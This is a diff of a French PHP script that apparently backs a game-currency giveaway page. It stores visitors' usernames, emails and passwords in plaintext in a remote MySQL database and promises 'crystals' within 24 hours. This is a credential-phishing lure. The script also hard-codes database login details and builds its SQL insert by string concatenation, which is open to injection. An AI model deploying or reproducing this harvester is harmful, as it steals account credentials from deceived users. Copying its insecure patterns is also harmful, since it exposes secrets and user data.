@@ -1,27 +1,32 @@
 <?php
 
- {
-    if (isset($_POST['submit']))
-    // Traiter les données du formulaire
+ if (isset($_POST['submit'])) {
 
-     
-    // Récupérez les données du formulaire
-    $username = $_POST['username'];
-    $email = $_POST['email'];
-    $mot_de_pass = $_POST['mot_de_pass'];
+    // Vérifiez que les données du formulaire sont valides
+    $username = htmlspecialchars($_POST['username']);
+    $email = htmlspecialchars($_POST['email']);
+    $mot_de_pass = htmlspecialchars($_POST['mot_de_pass']);
 
-    // Créez une connexion à la base de données
-    $dsn =  'mysql:host=db4free.net;dbname=goldenfarm';
-    $utilisateur = 'admin_users';
-    $password = 'Base3624@';
-    $pdo = new PDO($dsn, $utilisateur, $password);
+    if (empty($username)) {
+        echo "Le champ Nom d'utilisateur est obligatoire.";
+    } elseif (empty($email)) {
+        echo "Le champ Email est obligatoire.";
+    } elseif (empty($mot_de_pass)) {
+        echo "Le champ Mot de passe est obligatoire.";
+    } else {
 
-    // Insérez les données dans la base de données
-    $requete = "INSERT INTO Tb_goldenfarm (username, email, mot_de_pass) VALUES ('$username', '$email', '$mot_de_pass')";
-    $pdo->query($requete);
+        // Insérez les données dans la base de données
+        $dsn = 'mysql:host=db4free.net;dbname=goldenfarm';
+        $utilisateur = 'admin_users';
+        $password = 'Base3624@';
+        $pdo = new PDO($dsn, $utilisateur, $password);
 
-      // Message de succès
-  echo "Congratulations, you will receive the cristaux within 24 hours, please close this page";
+        $requete = "INSERT INTO Tb_goldenfarm (username, email, mot_de_pass) VALUES ('$username', '$email', '$mot_de_pass')";
+        $pdo->query($requete);
+
+        // Message de succès
+        echo "Félicitations, vous recevrez les cristaux dans les 24 heures, veuillez fermer cette page";
+    }
+
 }
-
 ?>
